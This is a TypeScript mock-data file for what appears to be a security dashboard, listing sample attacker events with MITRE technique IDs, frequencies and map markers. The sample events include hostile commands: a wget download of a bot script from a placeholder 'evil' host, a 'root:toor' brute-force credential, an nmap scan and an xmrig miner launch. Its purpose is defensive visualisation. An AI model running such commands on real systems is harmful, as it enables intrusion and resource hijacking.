export type ThreatEvent = {
  id: string;
  time: string;
  ip: string;
  country: string;
  technique: string;
  command: string;
  action: string;
  mttbMs: number;
  risk: number;
};

export const events: ThreatEvent[] = [
  {
    id: "evt-001",
    time: "17:42:11",
    ip: "45.155.205.1",
    country: "CN",
    technique: "T1105",
    command: "wget http://evil/bot.sh && chmod 777 bot.sh",
    action: "dry_run_block",
    mttbMs: 0.91,
    risk: 87,
  },
  {
    id: "evt-002",
    time: "17:42:04",
    ip: "91.240.118.71",
    country: "RU",
    technique: "T1110",
    command: "root:toor",
    action: "blocked",
    mttbMs: 1.08,
    risk: 72,
  },
  {
    id: "evt-003",
    time: "17:41:58",
    ip: "185.220.101.33",
    country: "DE",
    technique: "T1046",
    command: "nmap -sV 10.0.0.0/24",
    action: "watched",
    mttbMs: 0,
    risk: 49,
  },
  {
    id: "evt-004",
    time: "17:41:37",
    ip: "103.214.112.8",
    country: "VN",
    technique: "T1496",
    command: "./xmrig --config config.json",
    action: "blocked",
    mttbMs: 1.22,
    risk: 91,
  },
];

export const techniques = [
  { id: "T1105", name: "Ingress Tool Transfer", count: 42 },
  { id: "T1110", name: "Brute Force", count: 38 },
  { id: "T1059.004", name: "Unix Shell", count: 27 },
  { id: "T1046", name: "Network Service Discovery", count: 19 },
  { id: "T1496", name: "Resource Hijacking", count: 12 },
];

export const points = [
  { left: "72%", top: "42%", label: "CN", size: 24 },
  { left: "55%", top: "31%", label: "RU", size: 19 },
  { left: "49%", top: "37%", label: "DE", size: 15 },
  { left: "76%", top: "55%", label: "VN", size: 17 },
  { left: "23%", top: "50%", label: "BR", size: 13 },
];
